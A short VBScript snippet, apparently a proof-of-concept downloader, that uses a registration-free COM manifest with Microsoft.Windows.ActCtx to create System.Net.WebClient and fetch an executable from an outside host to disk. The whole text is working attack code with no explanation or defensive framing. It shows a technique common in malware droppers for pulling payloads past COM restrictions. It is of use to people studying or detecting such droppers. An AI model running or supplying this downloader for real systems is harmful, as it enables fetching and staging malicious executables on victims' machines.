'code in http://haiyangtop.cn/qjyq/1.vbs

manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
manifest = manifest &"<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">"
manifest = manifest &"<assemblyIdentity name=""System"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
manifest = manifest &"<clrClass clsid=""{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}"" progid=""System.Net.WebClient"" threadingModel=""Both"" name=""System.Net.WebClient"" runtimeVersion=""v4.0.30319"" /></assembly>"
set ax = CreateObject("Microsoft.Windows.ActCtx")
ax.ManifestText = manifest
Set sNetClient = ax.CreateObject("System.Net.WebClient")
webstuff = sNetClient.DownloadFile("http://www.haiyangtop.cn/calc.exe","d:/calc.exe")
wsh.echo webstuff